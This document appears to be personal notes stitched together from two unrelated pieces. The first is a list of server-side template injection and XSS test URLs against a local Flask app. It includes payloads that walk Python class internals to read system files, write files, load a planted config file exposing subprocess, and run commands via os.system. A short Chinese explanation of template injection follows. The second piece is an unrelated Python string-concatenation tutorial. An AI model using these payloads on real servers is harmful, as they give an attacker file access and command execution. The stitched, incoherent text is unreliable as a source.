http://127.0.0.1:5000/
http://127.0.0.1:5000/hello/world
http://127.0.0.1:5000/page_never_exist
http://127.0.0.1:5000/page_never_exist{{1+1}}
http://127.0.0.1:5000/hello/122<script>alert(1)</script>
http://127.0.0.1:5000/page_never_exist/<script>alert(1)</script>

http://127.0.0.1:5000/page_never_exist/{{config}}
http://127.0.0.1:5000/page_never_exist/{{self.__dict__}}
······

#http://127.0.0.1:5000/page_never_exist/{{''.__class__.__mro__[1].__subclasses__()[100].get_data(0, 'C://Windows//win.ini')}}
http://127.0.0.1:5000/page_never_exist/{{''.__class__.__mro__[2].__subclasses__()[40]('C://Windows//win.ini').read()}}
http://127.0.0.1:5000/page_never_exist/{{''.__class__.__mro__[2].__subclasses__()[40]('C://桌面路径//test.txt', 'w').write('hello')}}

http://127.0.0.1:5000/page_never_exist/{{''.__class__.__mro__[2].__subclasses__()[40]('C://Users//luke10481//Desktop//test.py', 'w').write('from subprocess import check_output ;RUNCMD = check_output;')}}
http://127.0.0.1:5000/page_never_exist/{{config.from_pyfile('C://Users//luke10481//Desktop//test.py')}}
http://127.0.0.1:5000/page_never_exist/{{config['RUNCMD']('calc')}}

http://127.0.0.1:5000/page_never_exist/{{().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals['linecache'].__dict__['os'].__dict__['system']('calc')}}

服务器端模板注入是指攻击者能够使用模板语法将恶意有效负载注入模板，然后在服务器端执行该模板。注入任意模板指令以操纵模板引擎，使他们能够完全控制服务器。
模板引擎旨在通过将固定模板与易变数据相结合来生成网页。当用户输入的内容直接连接到模板中，而不是作为数据传递时，可能会发生服务器端模板注入攻击。

"""
1. 使用加号“+”连接字符串

    用加号“+”连接两个字符串，连接后这两个字符串将连接成一个字符串。但需注意的是，
不能用“+”连接字符串和数字，需要把数字使用str()函数转换成字符串，或者直接在数字两侧加带引号，再进行连接、
"""
str11 = "hello"
str12 = "world"
str13 = str11 + str12
print(str13)         # helloworld
""" 注： 但在python中，尽量少用加号“+”连接字符串，原因如下：在python中，String对象是定长对象，一旦创建，长度就不可变化，若是使用+号连接两个字符串，则会新开辟一段长度总和长度的内存，再将两个字符串memcpy进去。如果要连接N个String对象，则要进行N-1次内存申请和拷贝。 官方推荐的是使用字符串的join方法，该方法对于连接一个list或tuple中的元素非常有效，它会先统计所有元素的长度，申请内存，然后拷贝。 """
"""
2. 使用逗号连接字符串
    python可用逗号“，”将多个字符串连接为一个元组，再通过join()方法将元组中的各个元素连接为一个字符串，
从而达到连接字符串的目的。若是直接将字符串逗号连接后print，字符串之间会多一个空格。
"""
str21 = "hello"
str22 = "world"
str23 = str21, str22

print(str21, str22)       # hello world

print(str23)              # ('hello', 'world')
print(''.join(str23))
"""
3. 直接连接字符串
    python独有的方法。只要把两个字符串放在一起，无论中间有空白或没有空白，
两个字符串将自动连接为一个字符串(空格不会自动去掉).
"""
print("hello" "world")      # helloworld
"""
4. 格式化方式拼接（ % ， format）
   符号“%”,{} 连接一个字符串和一组变量，字符串中的特殊标记会被自动用右边变量组中的变量进行替换.
（字符串之间会有空格隔开）
"""
print('%s %s %s' % ('我', '是', '中国人'))     # 我 是 中国人

print("{} {} {}".format('我', '是', '中国人'))
"""
5. 通过join()函数连接字符串
   利用字符串函数 join()，它是 split() 方法的逆方法。这个函数接收一个列表，
然后用字符串依次连接列表中每一个元素，其类似方法2的最后一步
"""
lists = ['hello', 'world']
print('_'.join(lists))       # hello_world